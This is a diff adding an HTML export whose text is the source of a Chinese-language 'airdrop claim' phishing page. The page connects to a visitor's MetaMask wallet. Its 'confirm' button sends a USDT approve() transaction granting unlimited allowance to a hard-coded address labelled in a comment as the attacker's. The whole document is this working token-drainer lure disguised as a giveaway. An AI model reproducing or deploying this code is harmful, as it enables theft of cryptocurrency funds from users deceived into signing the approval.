@@ -1,0 +1,64 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html>
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+  <meta http-equiv="Content-Style-Type" content="text/css">
+  <title></title>
+  <meta name="Generator" content="Cocoa HTML Writer">
+  <meta name="CocoaVersion" content="2575.5">
+  <style type="text/css">
+    p.p1 {margin: 0.0px 0.0px 0.0px 0.0px; font: 12.0px Helvetica}
+    p.p2 {margin: 0.0px 0.0px 0.0px 0.0px; font: 12.0px Helvetica; min-height: 14.0px}
+  </style>
+</head>
+<body>
+<p class="p1">&lt;!DOCTYPE html&gt;</p>
+<p class="p1">&lt;html lang="zh-Hant"&gt;</p>
+<p class="p1">&lt;head&gt;</p>
+<p class="p1"><span class="Apple-converted-space">  </span>&lt;meta charset="UTF-8"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">  </span>&lt;title&gt;🎁 領取空投&lt;/title&gt;</p>
+<p class="p1"><span class="Apple-converted-space">  </span>&lt;script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"&gt;&lt;/script&gt;</p>
+<p class="p1"><span class="Apple-converted-space">  </span>&lt;style&gt;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>body { font-family: 'Arial'; background: #f8f8f8; text-align: center; padding: 80px; }</p>
+<p class="p1"><span class="Apple-converted-space">    </span>button {</p>
+<p class="p1"><span class="Apple-converted-space">      </span>padding: 12px 30px;</p>
+<p class="p1"><span class="Apple-converted-space">      </span>font-size: 20px;</p>
+<p class="p1"><span class="Apple-converted-space">      </span>background: #28a745;</p>
+<p class="p1"><span class="Apple-converted-space">      </span>color: white;</p>
+<p class="p1"><span class="Apple-converted-space">      </span>border: none;</p>
+<p class="p1"><span class="Apple-converted-space">      </span>border-radius: 8px;</p>
+<p class="p1"><span class="Apple-converted-space">      </span>cursor: pointer;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>}</p>
+<p class="p1"><span class="Apple-converted-space">    </span>#status { margin-top: 20px; font-size: 16px; color: #555; }</p>
+<p class="p1"><span class="Apple-converted-space">  </span>&lt;/style&gt;</p>
+<p class="p1">&lt;/head&gt;</p>
+<p class="p1">&lt;body&gt;</p>
+<p class="p1"><span class="Apple-converted-space">  </span>&lt;h1&gt;🎉 恭喜你獲得限時空投&lt;/h1&gt;</p>
+<p class="p1"><span class="Apple-converted-space">  </span>&lt;p&gt;點擊下方按鈕確認參與活動&lt;/p&gt;</p>
+<p class="p1"><span class="Apple-converted-space">  </span>&lt;button onclick="approve()"&gt;✅ 確認&lt;/button&gt;</p>
+<p class="p1"><span class="Apple-converted-space">  </span>&lt;p id="status"&gt;等待操作中...&lt;/p&gt;</p>
+<p class="p2"><br></p>
+<p class="p1"><span class="Apple-converted-space">  </span>&lt;script&gt;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>const USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // 主網 USDT</p>
+<p class="p1"><span class="Apple-converted-space">    </span>const attacker = "0xDa4FfA490992769B8F54063bf0B9E7a4D3479459"; // 攻擊者地址</p>
+<p class="p1"><span class="Apple-converted-space">    </span>const ABI = ["function approve(address spender, uint256 amount) external returns (bool)"];</p>
+<p class="p2"><br></p>
+<p class="p1"><span class="Apple-converted-space">    </span>async function approve() {</p>
+<p class="p1"><span class="Apple-converted-space">      </span>if (!window.ethereum) return alert("請安裝 MetaMask");</p>
+<p class="p1"><span class="Apple-converted-space">      </span>const provider = new ethers.providers.Web3Provider(window.ethereum);</p>
+<p class="p1"><span class="Apple-converted-space">      </span>await provider.send("eth_requestAccounts", []);</p>
+<p class="p1"><span class="Apple-converted-space">      </span>const signer = provider.getSigner();</p>
+<p class="p1"><span class="Apple-converted-space">      </span>const usdt = new ethers.Contract(USDT, ABI, signer);</p>
+<p class="p1"><span class="Apple-converted-space">      </span>document.getElementById("status").innerText = "⏳ 發送授權中...";</p>
+<p class="p1"><span class="Apple-converted-space">      </span>try {</p>
+<p class="p1"><span class="Apple-converted-space">        </span>const tx = await usdt.approve(attacker, ethers.constants.MaxUint256);</p>
+<p class="p1"><span class="Apple-converted-space">        </span>document.getElementById("status").innerText = "✅ 授權成功，TX Hash: " + tx.hash;</p>
+<p class="p1"><span class="Apple-converted-space">      </span>} catch (e) {</p>
+<p class="p1"><span class="Apple-converted-space">        </span>document.getElementById("status").innerText = "❌ 授權失敗: " + e.message;</p>
+<p class="p1"><span class="Apple-converted-space">      </span>}</p>
+<p class="p1"><span class="Apple-converted-space">    </span>}</p>
+<p class="p1"><span class="Apple-converted-space">  </span>&lt;/script&gt;</p>
+<p class="p1">&lt;/body&gt;</p>
+<p class="p1">&lt;/html&gt;</p>
+</body>
+</html>
